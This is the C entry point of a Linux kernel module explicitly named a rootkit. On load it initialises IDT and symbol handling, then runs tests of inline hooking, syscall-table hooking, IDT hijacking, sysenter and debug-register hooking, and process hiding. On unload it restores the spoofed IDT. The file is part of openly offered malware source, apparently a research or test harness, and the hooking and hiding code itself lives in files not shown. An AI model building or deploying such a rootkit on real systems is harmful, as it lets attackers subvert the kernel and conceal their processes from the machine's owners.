#include "log.h"
#include "idt.h"
#include "symbol.h"
#include "../tests/tests.h"
#include "../tests/features/feature_tests.h"

#include <linux/module.h>
#include <linux/kernel.h>

static int __init rootkit_init_module(void)
{
    /* Init rootkit */
    idt_init();
    init_symbols();

    /* Run some tests */
    pr_log("Core functions:\n");
    test_inline_hooking();
    test_hook();
    test_syscall_tbl();
    test_idt_hijacking();
    test_sysenter();
    test_debug_reg();

    pr_log("Feature functions:\n");
    test_process_hiding();
    return 0;
}

static void __exit rootkit_cleanup_module(void)
{
    if (idt_spoofed())
        idt_restore();
}

module_init(rootkit_init_module);
module_exit(rootkit_cleanup_module);
MODULE_LICENSE("GPL");
